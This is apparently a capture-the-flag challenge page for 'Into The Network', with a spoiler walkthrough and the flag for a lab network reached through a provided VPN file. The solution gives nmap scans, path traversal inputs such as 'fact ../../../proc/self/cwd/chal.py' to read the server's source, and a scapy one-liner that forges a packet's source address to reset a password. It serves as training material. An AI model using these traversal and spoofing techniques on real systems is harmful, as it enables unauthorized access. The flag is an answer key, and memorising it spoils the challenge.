# Title

Into The Network

## Authors

-   @stacksparrow4

## Category

-   Misc

## Description

I came across an interesting file... it seems to be an entry point into a hidden
network. Care to take a look?

## Difficulty

-   Medium

## Points

080

## Files

-   [client1.ovpn](./_ctfd/files/client1.ovpn): ovpn file given as part of challenge

## Solution

<details>
<summary>Spoiler</summary>

### Idea

Utilise a series of miscellaneous and network based recon and exploits to
find the flag.

### Walkthrough

Note: strongly recommend using a linux VM for this challenge.

1. Connect to the network using the ovpn file.
1. Scan the network using an nmap ping scan as follows:

    ```bash
    > nmap -sn 10.8.0.0/24
    Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-17 12:34 AEST
    Nmap scan report for 10.8.0.1
    Host is up (0.015s latency).
    Nmap done: 256 IP addresses (1 host up) scanned in 3.46 seconds
    ```

    We can see that the host 10.8.0.1 is on the network.

1. Scan this host with nmap

    ```bash
    > nmap 10.8.0.1
    Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-17 12:49 AEST
    Nmap scan report for 10.8.0.1
    Host is up (0.014s latency).
    Not shown: 999 closed ports
    PORT     STATE SERVICE
    8000/tcp open  http-alt

    Nmap done: 1 IP address (1 host up) scanned in 2.36 seconds
    ```

1. Checking this using a web browser hints that there is a UDP port open on the
   box. So our next step is to perform a udp scan:

    ```bash
    > sudo nmap -sU -T5 10.8.0.1 | grep open
    Not shown: 929 open|filtered ports, 70 closed ports
    1234/udp open  search-agent
    ```

1. This shows us that port 1234 is open. We can connect to it using netcat `nc -u 10.8.0.1 1234`
   which shows a sort of command line. Playing around with this reveals an LFI
   vulnerability in the `fact` command. We can then run `fact ../../../proc/self/cmdline`
   to get the cmdline of the current process, revealing the script is running `chal.py`.
   We can then use `fact ../../../proc/self/cwd/chal.py` to get the source code of the challenge.
1. Reviewing the source code shows that we can reset the password if our address
   is `1.2.3.4`. However, as this is using the UDP protocol, we can use scapy to
   forge the packet's src address and set the password.

    ```python
    send(IP(dst='10.8.0.1', src='1.2.3.4')/UDP(sport=RandShort(), dport=1234)/Raw(load='setpass testpass4\n'), iface='tun0')
    ```

1. We can then use `flag testpass4` from our netcat connection to get the flag.

### Flag

`SKYLIGHT{I_3AT_PACK3TS_4_BRE4KFA5T}`

</details>
